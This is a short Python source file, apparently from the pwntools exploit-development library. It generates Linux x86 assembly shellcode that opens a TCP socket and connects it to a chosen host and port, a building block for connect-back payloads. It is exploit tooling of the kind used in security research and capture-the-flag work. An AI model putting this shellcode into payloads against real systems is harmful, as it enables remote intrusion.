from pwn import ip, htons

def connect(host, port):
    """Args: host, port
    Connects to host on port.  Leaves socket in EAX."""
    return """
        ;; Connect to %(hostname)s on %(portnum)d
        ;; Socket file descriptor is placed in ESI

        ;; sock = socket(AF_INET, SOCK_STREAM, 0)
        push SYS_socketcall
        pop eax
        push SYS_socketcall_socket
        pop ebx
        cdq                     ; clear EDX
        push edx                ; IPPROTO_IP (= 0)
        push ebx                ; SOCK_STREAM
        push AF_INET
        mov ecx, esp
        int 0x80

        mov esi, eax

        ;; connect(sock, &addr, sizeof addr); // sizeof addr == 0x10
        push %(host)d
        push word %(port)d
        push word AF_INET
        mov ecx, esp
        push 0x10               ; sizeof addr (= 0x10)
        push ecx                ; &addr
        push eax                ; sock
        mov ecx, esp            ; args
        inc ebx
        inc ebx                 ; EBX = connect (= 3)
        mov al, SYS_socketcall
        int 0x80
""" % {'hostname': host,
       'portnum' : int(port),
       'host'    : ip(host),
       'port'    : htons(int(port))
       }
